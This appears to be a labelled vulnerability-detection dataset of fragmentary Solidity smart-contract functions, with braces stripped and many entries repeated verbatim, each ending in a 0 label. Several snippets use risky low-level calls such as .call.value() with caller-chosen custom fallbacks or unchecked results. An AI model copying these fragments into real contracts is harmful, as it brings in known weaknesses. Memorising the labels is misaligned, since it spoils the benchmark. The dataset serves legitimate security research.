plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
237 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
238 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
239 36645.sol
function purchase_tokens() {
require(msg.sender == developer);
if (this.balance < eth_minimum) return;
if (kill_switch) return;
require(sale != 0x0);
bought_tokens = true;
contract_eth_value = this.balance;
require(sale.call.value(contract_eth_value)());
require(this.balance==0);
0
---------------------------------
240 7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
241 7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
242 7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
243 7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
244 7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
245 29601.sol
function transferInternal(address from, address to, uint256 value, bytes data, bool useCustomFallback, string customFallback) internal returns (bool success) {
bool status = super.transferInternal(from, to, value);
if (status) {
if (isContract(to)) {
ContractReceiver receiver = ContractReceiver(to);
if (useCustomFallback) {
require(receiver.call.value(0)(bytes4(keccak256(customFallback)), from, value, data) == true);
} else {
receiver.tokenFallback(from, value, data);
Transfer(from, to, value, data);
return status;
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool success) {
require(locked == false);
bool status = transferInternal(msg.sender, to, value, data, true, customFallback);
return status;
function transferInternal(address from, address to, uint256 value, bytes data) internal returns (bool success) {
return transferInternal(from, to, value, data, false, "");
function transferInternal(address from, address to, uint256 value) internal returns (bool success) {
require(locked == false);
bytes memory data;
return transferInternal(from, to, value, data, false, "");
function claimableTransfer(uint256 _time, address _from,address _to, uint256 _value, bytes _data, bool _useCustomFallback, string _customFallback) internal returns (bool success)
uint256 senderCurrentBalance = balanceOf(_from);
uint256 receiverCurrentBalance = balanceOf(_to);
uint256 _totalSupply = totalSupply();
bool status = super.transferInternal(_from, _to, _value, _data, _useCustomFallback, _customFallback);
require(status);
claimInternal(_time, _from, senderCurrentBalance, _totalSupply);
claimInternal(_time, _to, receiverCurrentBalance, _totalSupply);
return true;
0
---------------------------------
246 14741.sol
function transferToContractWithCustomFallback(address _to, uint _value, bytes _data, string _custom_fallback) private returns(bool success) {
require(balanceOf(msg.sender) > _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
emit Transfer(msg.sender, _to, _value, _data);
return true;
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns(bool success) {
require(!frozenAccount[msg.sender]);
require(!frozenAccount[_to]);
if (isContract(_to)) {
return transferToContractWithCustomFallback(_to, _value, _data, _custom_fallback);
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
247 14741.sol
function transferToContractWithCustomFallback(address _to, uint _value, bytes _data, string _custom_fallback) private returns(bool success) {
require(balanceOf(msg.sender) > _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
emit Transfer(msg.sender, _to, _value, _data);
return true;
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns(bool success) {
require(!frozenAccount[msg.sender]);
require(!frozenAccount[_to]);
if (isContract(_to)) {
return transferToContractWithCustomFallback(_to, _value, _data, _custom_fallback);
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
248 14741.sol
function transferToContractWithCustomFallback(address _to, uint _value, bytes _data, string _custom_fallback) private returns(bool success) {
require(balanceOf(msg.sender) > _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
emit Transfer(msg.sender, _to, _value, _data);
return true;
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns(bool success) {
require(!frozenAccount[msg.sender]);
require(!frozenAccount[_to]);
if (isContract(_to)) {
return transferToContractWithCustomFallback(_to, _value, _data, _custom_fallback);
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
249 2301.sol
function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor {
_target.call.value(_value)(_data);
0
---------------------------------
250 2301.sol
function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor {
_target.call.value(_value)(_data);
0
---------------------------------
251 2301.sol
function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor {
_target.call.value(_value)(_data);
0
---------------------------------
252 12454.sol
function submitPool(uint256 weiAmount) public onlyAdmin noReentrancy {
require(contractStage < CONTRACT_SUBMIT_FUNDS, "Cannot resubmit pool.");
require(receiverAddress != 0x00, "receiver address cannot be empty");
uint256 contractBalance = address(this).balance;
if(weiAmount == 0){
weiAmount = contractBalance;
require(minContribution <= weiAmount && weiAmount <= contractBalance, "submitted amount too small or larger than the balance");
finalBalance = contractBalance;
require(receiverAddress.call.value(weiAmount).gas(gasleft().sub(5000))(),"Error submitting pool to receivingAddress");
contractBalance = address(this).balance;
if(contractBalance > 0) {
ethRefundAmount.push(contractBalance);
contractStage = CONTRACT_SUBMIT_FUNDS;
emit PoolSubmitted(receiverAddress, weiAmount);
0
---------------------------------
253 12454.sol
function submitPool(uint256 weiAmount) public onlyAdmin noReentrancy {
require(contractStage < CONTRACT_SUBMIT_FUNDS, "Cannot resubmit pool.");
require(receiverAddress != 0x00, "receiver address cannot be empty");
uint256 contractBalance = address(this).balance;
if(weiAmount == 0){
weiAmount = contractBalance;
require(minContribution <= weiAmount && weiAmount <= contractBalance, "submitted amount too small or larger than the balance");
finalBalance = contractBalance;
require(receiverAddress.call.value(weiAmount).gas(gasleft().sub(5000))(),"Error submitting pool to receivingAddress");
contractBalance = address(this).balance;
if(contractBalance > 0) {
ethRefundAmount.push(contractBalance);
contractStage = CONTRACT_SUBMIT_FUNDS;
emit PoolSubmitted(receiverAddress, weiAmount);
0
---------------------------------
254 35661.sol
function refund() stopInEmergency {
if(getState() != State.Refunding) throw;
address investor = msg.sender;
if(balances[investor] == 0) throw;
uint amount = balances[investor];
delete balances[investor];
if(!(investor.call.value(amount)())) throw;
Refunded(investor, amount);
0
---------------------------------
255 35661.sol
function refund() stopInEmergency {
if(getState() != State.Refunding) throw;
address investor = msg.sender;
if(balances[investor] == 0) throw;
uint amount = balances[investor];
delete balances[investor];
if(!(investor.call.value(amount)())) throw;
Refunded(investor, amount);
0
---------------------------------
256 35661.sol
function refund() stopInEmergency {
if(getState() != State.Refunding) throw;
address investor = msg.sender;
if(balances[investor] == 0) throw;
uint amount = balances[investor];
delete balances[investor];
if(!(investor.call.value(amount)())) throw;
Refunded(investor, amount);
0
---------------------------------
257 35661.sol
function refund() stopInEmergency {
if(getState() != State.Refunding) throw;
address investor = msg.sender;
if(balances[investor] == 0) throw;
uint amount = balances[investor];
delete balances[investor];
if(!(investor.call.value(amount)())) throw;
Refunded(investor, amount);
0
---------------------------------
258 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
259 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
260 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
261 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
262 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
263 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
264 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
265 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
266 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
267 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
268 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
269 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
270 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
271 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
272 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
273 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
274 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
275 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
276 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
277 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
278 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
279 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
280 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
281 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
282 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
283 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
284 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
285 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
286 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
287 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
288 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
289 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
290 22902.sol
